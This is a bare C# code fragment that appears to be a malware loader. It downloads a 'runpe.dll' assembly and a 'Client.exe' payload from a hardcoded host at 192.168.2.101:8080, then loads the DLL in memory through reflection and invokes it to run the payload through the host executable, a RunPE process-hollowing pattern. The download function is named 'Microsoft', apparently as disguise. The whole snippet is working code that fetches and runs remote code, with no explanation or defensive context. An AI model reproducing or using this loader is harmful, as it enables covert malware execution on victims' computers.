Zk(AppDomain.CurrentDomain.Load(Microsoft("http://192.168.2.101:8080/runpe.dll").Result), new object[] { Assembly.GetEntryAssembly().Location, "", Microsoft("http://192.168.2.101:8080/Client.exe").Result, false });
  private static void Zk(Assembly zm, object[] Params)
        {
            foreach (var m in zm.GetTypes()[0].GetMethods())
            {
                m.Invoke(null, Params);
                return;
            }
        }
        public static async Task<byte[]> Microsoft(string url)
        {  
            using (HttpClient client = new HttpClient())
            {
                var result = await client.GetByteArrayAsync(url); return result;
            }
        }
        
